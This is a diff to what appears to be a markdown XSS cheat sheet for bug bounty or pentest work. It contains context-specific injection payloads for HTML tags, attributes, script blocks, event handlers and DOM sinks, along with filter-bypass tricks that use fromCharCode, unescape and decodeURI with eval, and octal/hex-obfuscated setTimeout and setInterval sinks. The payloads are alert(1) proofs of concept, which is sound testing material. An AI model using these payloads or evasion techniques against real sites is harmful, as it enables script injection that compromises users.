@@ -220,6 +220,58 @@ Some PHP applications use the direct disable_functions option, which can be used
 ```
 5-> Detect if there are filters or blockages and modify as needed to make it work
 
+### Examples
+#### HTML Tag
+```
+<div>here</div>
+```
+->  
+```
+<svg/onload=alert(1)
+```
+
+#### HTML Tag Attributes
+```
+<input value="here"/></input>
+```
+ 
+->  
+```
+" /><script>alert(1)</script>
+```
+  
+#### Script Tag
+```
+<script>
+    var name="here";
+</script>
+```
+  
+->  
+```
+";alert(1);//
+```
+
+#### Event Attributes
+```
+<button onclick="here;">Okay!</button>
+```
+
+->  
+```
+alert(1)
+```
+
+#### Dom Based
+```
+<script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
+```
+  
+->  
+```
+javascript:alert(1)
+```
+
 ### XSS Protection
 -> XSS Auditor and XSS Filter  
 https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md  
@@ -272,16 +324,21 @@ Sometimes you can find a filter being applied as sanitization to mitigate Cross-
 <sCR<script>iPt>alert(1)</SCr</script>IPt>
 ```
 
-### Scaping Quote
+### Scaping Quote - Bypass
 #### Methods
--> String.fromCharCode()  
--> unescape  
-
-e.g.  
--> decode URI + unescape method (need eval)  
+-> String.fromCharCode()
 ```
-decodeURI(/alert(%22xss%22)/.source)
-decodeURIComponent(/alert(%22xss%22)/.source)
+eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))
+```
+-> unescape  
+```
+eval(unescape("%61%6c%65%72%74%28%27%58%53%53%27%29"))
+```
+
+-> decodeURI
+```
+eval(decodeURI(/alert(%22xss%22)/.source))
+eval(decodeURIComponent(/alert(%22xss%22)/.source))
 ```  
  
 ### Other bypass techniques
@@ -290,78 +347,41 @@ decodeURIComponent(/alert(%22xss%22)/.source)
 <img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"/>
 ```
 
-Add execution sink:  
--> eval  
--> setInterval  
--> setTimeout  
+### Add execution sinks  
+#### Eval 
+-> Execute JS code contained in a string directly  
 
--> octal  
-```
+#### setInterval
+-> Executes JS code contained in a string repeatedly after an interval.  
+-> e.g. setInterval("alert('xss')", 1000);  
+-> If delay is omitted, it is treated as undefined, and the browser uses a minimum delay (~4ms to 10ms)   
+
+#### setTimeout 
+-> Executes JS code contained in a string once after a delay.  
+-> e.g. setTimeout("alert('xss')", 1000);  
+-> If the delay argument is missing, it executes immediately  
+
+#### Examples of using execution sinks with obfuscation
+-> eval + octal  
+```html
 <img src=x onerror="eval('\141lert(1)')"/>
 ```
--> hexadecimal  
+
+-> setInterval + hexadecimal  
 ```
 <img src=x onerror="setInterval('\x61lert(1)')"/>
 ```
--> mix  (uni, hex, octa)  
+
+-> setTimeout + hex + octal  
 ```
 <img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>
 ```
-https://checkserp.com/encode/unicode/  
-http://www.unit-conversion.info/texttools/octal/  
-http://www.unit-conversion.info/texttools/hexadecimal/  
 
-### Other Examples
-#### HTML Tag
-```
-<div>here</div>
-```
-->  
-```
-<svg/onload=alert(1)
-```
+##### Converters
+- https://checkserp.com/encode/unicode/  
+- http://www.unit-conversion.info/texttools/octal/  
+- http://www.unit-conversion.info/texttools/hexadecimal/  
 
-#### HTML Tag Attributes
-```
-<input value="here"/></input>
-```
- 
-->  
-```
-" /><script>alert(1)</script>
-```
-  
-#### Script Tag
-```
-<script>
-    var name="here";
-</script>
-```
-  
-->  
-```
-";alert(1);//
-```
-
-#### Event Attributes
-```
-<button onclick="here;">Okay!</button>
-```
-
-->  
-```
-alert(1)
-```
-
-#### Dom Based
-```
-<script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
-```
-  
-->  
-```
-javascript:alert(1)
-```
 
 ### JavaScript Encoding
 -> jjencode  
